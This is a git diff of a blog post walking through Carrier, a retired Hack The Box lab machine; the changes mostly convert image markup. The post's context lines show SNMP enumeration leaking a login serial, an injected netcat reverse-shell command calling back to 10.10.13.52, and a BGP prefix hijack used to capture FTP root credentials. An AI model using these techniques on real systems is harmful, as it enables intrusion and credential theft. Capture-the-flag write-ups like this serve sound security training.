@@ -17,10 +17,10 @@ This post documents the complete walkthrough of Carrier, a retired vulnerable [V
 
 <!--more-->
 
-## On this post 
-{:.no_toc} 
+## On this post
+{:.no_toc}
 
-* TOC 
+* TOC
 {:toc}
 
 ## Background
@@ -54,9 +54,9 @@ PORT   STATE    SERVICE REASON         VERSION
 
 `nmap` finds `22/tcp` and `80/tcp` open. In any case, let's start with the `http` service. Here's how it looks like.
 
-<a class="image-popup">
-![2b0f6dd0.png](/assets/images/posts/carrier-htb-walkthrough/2b0f6dd0.png)
-</a>
+
+{% include image.html image_alt="2b0f6dd0.png" image_src="/93ab5c98-ba29-4a88-b893-31e8b32ce9ef/2b0f6dd0.png" %}
+
 
 It's a login page with strange looking error codes.
 
@@ -92,23 +92,23 @@ Requests/sec.: 48.86101
 
 Among the directories discovered, `doc` offers some valuable information. In it, there's a PDF document containing the description of the error codes.
 
-<a class="image-popup">
-![9e681a5f.png](/assets/images/posts/carrier-htb-walkthrough/9e681a5f.png)
-</a>
+
+{% include image.html image_alt="9e681a5f.png" image_src="/93ab5c98-ba29-4a88-b893-31e8b32ce9ef/9e681a5f.png" %}
+
 
 You can see what the two strange looking error codes mean. And the password is reset to the serial number is what I think it meant.
 
 After a couple of enumeration rounds I still couldn't find the serial number. It then dawned upon me that I've not check SNMP. It's a web interface to a piece of hardware after all. Many hardware vendors include SNMP for their products. Let's see if we can `snmpwalk` the MIB hierarchy.
 
-<a class="image-popup">
-![6d2bff29.png](/assets/images/posts/carrier-htb-walkthrough/6d2bff29.png)
-</a>
+
+{% include image.html image_alt="6d2bff29.png" image_src="/93ab5c98-ba29-4a88-b893-31e8b32ce9ef/6d2bff29.png" %}
+
 
 What do you know! The serial number is exposed and we manage to log in with credentials (`admin:NET_45JDX23`),
 
-<a class="image-popup">
-![328e9162.png](/assets/images/posts/carrier-htb-walkthrough/328e9162.png)
-</a>
+
+{% include image.html image_alt="328e9162.png" image_src="/93ab5c98-ba29-4a88-b893-31e8b32ce9ef/328e9162.png" %}
+
 
 Holy cow!
 
@@ -116,21 +116,21 @@ Holy cow!
 
 While I was checking out the pages, I chanced upon the **Diagnostics** page. It allows built-in checks and this is how it looks like.
 
-<a class="image-popup">
-![54c15bf2.png](/assets/images/posts/carrier-htb-walkthrough/54c15bf2.png)
-</a>
+
+{% include image.html image_alt="54c15bf2.png" image_src="/93ab5c98-ba29-4a88-b893-31e8b32ce9ef/54c15bf2.png" %}
+
 
 Doesn't the output looks like the output of `ps`? There's a hidden input field that's submitted along with the form whenever the button **Verify status** is clicked.
 
-<a class="image-popup">
-![e4d923a2.png](/assets/images/posts/carrier-htb-walkthrough/e4d923a2.png)
-</a>
+
+{% include image.html image_alt="e4d923a2.png" image_src="/93ab5c98-ba29-4a88-b893-31e8b32ce9ef/e4d923a2.png" %}
+
 
 The value to the input field `check` is a `base64`-encoded `quagga`.
 
-<a class="image-popup">
-![939c5bd9.png](/assets/images/posts/carrier-htb-walkthrough/939c5bd9.png)
-</a>
+
+{% include image.html image_alt="939c5bd9.png" image_src="/93ab5c98-ba29-4a88-b893-31e8b32ce9ef/939c5bd9.png" %}
+
 
 Hmm. Something funky is going on here.
 
@@ -164,9 +164,9 @@ echo
 rm -f cookie
 ```
 
-<a class="image-popup">
-![e14a8063.png](/assets/images/posts/carrier-htb-walkthrough/e14a8063.png)
-</a>
+
+{% include image.html image_alt="e14a8063.png" image_src="/93ab5c98-ba29-4a88-b893-31e8b32ce9ef/e14a8063.png" %}
+
 
 I see what's going on here. There's PHP code that does something like this.
 
@@ -180,9 +180,9 @@ If I input something like this, I should get a shell, right? Let's try it out.
 --; rm -rf /tmp/p; mknod /tmp/p p; /bin/sh 0</tmp/p | nc 10.10.13.52 1234 > /tmp/p
 ```
 
-<a class="image-popup">
-![301614a9.png](/assets/images/posts/carrier-htb-walkthrough/301614a9.png)
-</a>
+
+{% include image.html image_alt="301614a9.png" image_src="/93ab5c98-ba29-4a88-b893-31e8b32ce9ef/301614a9.png" %}
+
 
 Indeed. A `root` shell no less!
 
@@ -190,41 +190,41 @@ Indeed. A `root` shell no less!
 
 My happiness soon faded because this isn't a `root` shell. Nonetheless, `user.txt` is located here.
 
-<a class="image-popup">
-![2308d637.png](/assets/images/posts/carrier-htb-walkthrough/2308d637.png)
-</a>
+
+{% include image.html image_alt="2308d637.png" image_src="/93ab5c98-ba29-4a88-b893-31e8b32ce9ef/2308d637.png" %}
+
 
 You can see that the host isn't the final host; it's a router. It has three network interfaces.
 
-<a class="image-popup">
-![3dff73cf.png](/assets/images/posts/carrier-htb-walkthrough/3dff73cf.png)
-</a>
+
+{% include image.html image_alt="3dff73cf.png" image_src="/93ab5c98-ba29-4a88-b893-31e8b32ce9ef/3dff73cf.png" %}
+
 
 And, here's the routing table.
 
-<a class="image-popup">
-![5470c993.png](/assets/images/posts/carrier-htb-walkthrough/5470c993.png)
-</a>
+
+{% include image.html image_alt="5470c993.png" image_src="/93ab5c98-ba29-4a88-b893-31e8b32ce9ef/5470c993.png" %}
+
 
 Looking at `/root/.ssh/authorized_keys` reveals who's allowed to SSH into the router.
 
-<a class="image-popup">
-![e8c7da43.png](/assets/images/posts/carrier-htb-walkthrough/e8c7da43.png)
-</a>
+
+{% include image.html image_alt="e8c7da43.png" image_src="/93ab5c98-ba29-4a88-b893-31e8b32ce9ef/e8c7da43.png" %}
+
 
 ***In case you are wondering, I upgraded the shell with the Python3 `pty` module and some `stty` magic.***
 
 Looking back at the `debug` directory, a `phpinfo()` page was there for the viewing.
 
-<a class="image-popup">
-![927b454f.png](/assets/images/posts/carrier-htb-walkthrough/927b454f.png)
-</a>
+
+{% include image.html image_alt="927b454f.png" image_src="/93ab5c98-ba29-4a88-b893-31e8b32ce9ef/927b454f.png" %}
+
 
 That's the `uname -a` of the `web` host. Further down, the server IP is shown.
 
-<a class="image-popup">
-![75834d4a.png](/assets/images/posts/carrier-htb-walkthrough/75834d4a.png)
-</a>
+
+{% include image.html image_alt="75834d4a.png" image_src="/93ab5c98-ba29-4a88-b893-31e8b32ce9ef/75834d4a.png" %}
+
 
 Neat. Saves me the effort to hunt for it in `/24` space.
 
@@ -234,21 +234,21 @@ _A bigger problem looms._ What's next? Where do we proceed from here?
 
 Earlier on, the `doc` directory revealed the error codes. Along with it, lies the ISPs' [BGP](https://en.wikipedia.org/wiki/Border_Gateway_Protocol) peering layout of their respective autonomous systems (or AS).
 
-<a class="image-popup">
-![ca85abb8.png](/assets/images/posts/carrier-htb-walkthrough/ca85abb8.png)
-</a>
+
+{% include image.html image_alt="ca85abb8.png" image_src="/93ab5c98-ba29-4a88-b893-31e8b32ce9ef/ca85abb8.png" %}
+
 
 Coupled with the tickets, we can formalized a game plan.
 
-<a class="image-popup">
-![4336f0de.png](/assets/images/posts/carrier-htb-walkthrough/4336f0de.png)
-</a>
+
+{% include image.html image_alt="4336f0de.png" image_src="/93ab5c98-ba29-4a88-b893-31e8b32ce9ef/4336f0de.png" %}
+
 
 But before we go over the game plan, let's confirm the BGP peering topology with `vtysh -c 'show ip bgp'` on `r1` (that's the host we are in. It's running a software-based router daemon `quagga` capable of doing BGP).
 
-<a class="image-popup">
-![07bd4635.png](/assets/images/posts/carrier-htb-walkthrough/07bd4635.png)
-</a>
+
+{% include image.html image_alt="07bd4635.png" image_src="/93ab5c98-ba29-4a88-b893-31e8b32ce9ef/07bd4635.png" %}
+
 
 From the information above, we can see that the 10.120.15.0/24 prefix is advertised by AS300. That's why the best path to 10.120.15.0/24 is through the edge router in AS300 because it's directly connected to AS100. As such, it's only one hop away. Compare this to another alternative and valid route. The route must first go to the edge router in AS200 and then to the edge router in AS300.
 
@@ -258,33 +258,33 @@ Enter BGP prefix hijacking. If we advertise a more specific prefix than 10.120.1
 
 Now, let's see what I've found. The FTP server is at 10.120.15.10.
 
-<a class="image-popup">
-![a0830341.png](/assets/images/posts/carrier-htb-walkthrough/a0830341.png)
-</a>
+
+{% include image.html image_alt="a0830341.png" image_src="/93ab5c98-ba29-4a88-b893-31e8b32ce9ef/a0830341.png" %}
+
 
 In addtion to FTP, the server is also running DNS and SSH service.
 
-<a class="image-popup">
-![3e7ffac3.png](/assets/images/posts/carrier-htb-walkthrough/3e7ffac3.png)
-</a>
+
+{% include image.html image_alt="3e7ffac3.png" image_src="/93ab5c98-ba29-4a88-b893-31e8b32ce9ef/3e7ffac3.png" %}
+
 
 Which means, we can do something like this.
 
-<a class="image-popup">
-![a2d240ca.png](/assets/images/posts/carrier-htb-walkthrough/a2d240ca.png)
-</a>
+
+{% include image.html image_alt="a2d240ca.png" image_src="/93ab5c98-ba29-4a88-b893-31e8b32ce9ef/a2d240ca.png" %}
+
 
 Now, before we modify the prefix advertisement in `r1`, know this. There's a `cron` job that reverts `quagga` to its default configuration, lending evidence that I'm taking the right approach.
 
-<a class="image-popup">
-![06082df7.png](/assets/images/posts/carrier-htb-walkthrough/06082df7.png)
-</a>
+
+{% include image.html image_alt="06082df7.png" image_src="/93ab5c98-ba29-4a88-b893-31e8b32ce9ef/06082df7.png" %}
+
 
 The above can be shown with `crontab -l`. And here's what `/opt/restore.sh` looks like.
 
-<a class="image-popup">
-![15f58d6f.png](/assets/images/posts/carrier-htb-walkthrough/15f58d6f.png)
-</a>
+
+{% include image.html image_alt="15f58d6f.png" image_src="/93ab5c98-ba29-4a88-b893-31e8b32ce9ef/15f58d6f.png" %}
+
 
 We need to disable the `cron` job. Add a comment with a `#` to disable it.
 
@@ -294,15 +294,15 @@ We need to disable the `cron` job. Add a comment with a `#` to disable it.
 
 Next, advertise the most specific 10.120.15.10/32 prefix like so. Restart `quagga` and wait for the advertisement to propagate to the other two AS.
 
-<a class="image-popup">
-![db7492c0.png](/assets/images/posts/carrier-htb-walkthrough/db7492c0.png)
-</a>
+
+{% include image.html image_alt="db7492c0.png" image_src="/93ab5c98-ba29-4a88-b893-31e8b32ce9ef/db7492c0.png" %}
+
 
 The prefix is updated.
 
-<a class="image-popup">
-![0c7c2d2e.png](/assets/images/posts/carrier-htb-walkthrough/0c7c2d2e.png)
-</a>
+
+{% include image.html image_alt="0c7c2d2e.png" image_src="/93ab5c98-ba29-4a88-b893-31e8b32ce9ef/0c7c2d2e.png" %}
+
 
 The next step involves setting a service listening at `21/tcp`. I wrote a simple FTP server that does nothing but to extract the username and password; and to print it to `stdout`.
 
@@ -345,21 +345,21 @@ The last step is to configure the network interface `eth2` to 10.120.15.10/24 an
 
 Almost immediately, the credentials are printed out to `/tmp/ftp.txt`.
 
-<a class="image-popup">
-![1ac3dd57.png](/assets/images/posts/carrier-htb-walkthrough/1ac3dd57.png)
-</a>
+
+{% include image.html image_alt="1ac3dd57.png" image_src="/93ab5c98-ba29-4a88-b893-31e8b32ce9ef/1ac3dd57.png" %}
+
 
 Awesome. Now, we can revert the network configurations and log in to `carrier` with the `root` credentials to claim our prize.
 
-<a class="image-popup">
-![bc9d88bf.png](/assets/images/posts/carrier-htb-walkthrough/bc9d88bf.png)
-</a>
+
+{% include image.html image_alt="bc9d88bf.png" image_src="/93ab5c98-ba29-4a88-b893-31e8b32ce9ef/bc9d88bf.png" %}
+
 
 And our prize...
 
-<a class="image-popup">
-![c625a11a.png](/assets/images/posts/carrier-htb-walkthrough/c625a11a.png)
-</a>
+
+{% include image.html image_alt="c625a11a.png" image_src="/93ab5c98-ba29-4a88-b893-31e8b32ce9ef/c625a11a.png" %}
+
 
 :dancer:
 
